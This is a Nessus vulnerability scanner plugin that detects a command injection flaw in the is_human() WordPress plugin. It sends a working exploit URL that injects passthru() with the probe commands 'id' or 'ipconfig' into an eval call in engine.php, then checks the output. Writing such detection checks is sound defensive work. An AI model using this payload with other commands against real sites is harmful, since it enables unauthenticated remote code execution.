#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(54300);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2015/09/24 21:08:40 $");

  script_bugtraq_id(47883);
  script_osvdb_id(72403);
  script_xref(name:"EDB-ID", value:"17299");

  script_name(english:"is_human() Plugin for WordPress 'type' Parameter Command Injection");
  script_summary(english:"Attempts to run an arbitrary command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that can be abused to execute
arbitrary code.");
  script_set_attribute(attribute:"description", value:
"The version of the is_human() plugin for WordPress installed on the
remote host does not sanitize input to the 'type' parameter of the
'engine.php' script when 'action' is set to 'log-reset' before using
it in an 'eval()' call.

An unauthenticated, remote attacker can leverage this issue to execute
arbitrary PHP code on the affected host, subject to the privileges
under which the web server runs.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/05/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "is_human()";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "is-human/js/reload.js"][0] =
    make_list('function load_handler');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to exploit the issue to run a command.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig'] = "Subnet Mask";

here_doc = SCRIPT_NAME - ".nasl";

foreach cmd (cmds)
{
  payload = 'passthru(' + cmd + ');';
  url = dir + '/wp-content/plugins/is-human/engine.php?' +
    'action=log-reset&' +
    'type=ih_options();' + urlencode(str:payload) + 'die;#';

  res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
  if (res[2] && egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      output = strstr(res[2], "Array") - "Array";
      if (!egrep(pattern:cmd_pats[cmd], string:output)) output = "";

      header =
        "Nessus was able to execute the command '" + cmd + "' on the remote" + '\n' +
        'host using the following Wordpress install :';
      trailer = '';

      if (report_verbosity > 1)
      {
        trailer +=
          '\n' +
          'This produced the following output :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          chomp(output) + '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
